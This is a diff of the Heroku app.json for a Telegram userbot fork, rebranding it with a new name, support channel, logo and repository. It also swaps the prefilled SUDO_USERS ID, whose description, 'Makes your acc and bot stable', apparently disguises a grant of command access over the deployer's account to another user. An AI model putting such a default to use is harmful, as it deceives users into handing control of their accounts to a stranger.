@@ -1,7 +1,7 @@
 {
-  "name": "X-tra Telegram",
-  "description": "Userbot created by a SNAPDRAGON and custom fork by ANUBIS\n\n join https://t.me/X_tra_tele_support for any problems or support",
-  "logo": "https://telegra.ph/file/1be6c59f53fef57b5745b.jpg",
+  "name": "fuckinguserbot",
+  "description": "Userbot created by 乙Ŧ ツ Venom🕷️🕸️\n\n join https://t.me/FuckingUserbot for any problems or support",
+  "logo": "https://telegra.ph/%E4%B9%99%C5%A6-%E3%83%84-Venom-01-28",
   "keywords": [
     "telegram",
     "userbot",
@@ -9,7 +9,7 @@
     "modular",
     "productivity"
   ],
-  "repository": "https://github.com/Dark-Princ3/X-tra-Telegram/",
+  "repository": "https://github.com/venomvipers/fuckinguserbot/",
   "website": "#TODO",
   "success_url": "#TODO",
   "env": {
@@ -40,7 +40,7 @@
       "required": false
     },
     "GIT_REPO_NAME": {
-      "description": "Your repo name Example: Total-Noob-69/X-Tra-Telegram, but GITHUB_ACCESS_TOKEN must be setup first.",
+      "description": "Your repo name Example: Total-Noob-69/fuckinguserbot, but GITHUB_ACCESS_TOKEN must be setup first.",
       "value": "",
       "required": false
     },
@@ -56,7 +56,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes your acc and bot stable",
-      "value": "742506768",
+      "value": "1048670849",
       "required": false
     },
     "HEROKU_APP_NAME": {
@@ -120,3 +120,4 @@
     "url": "heroku/python"
   }]
 }
+
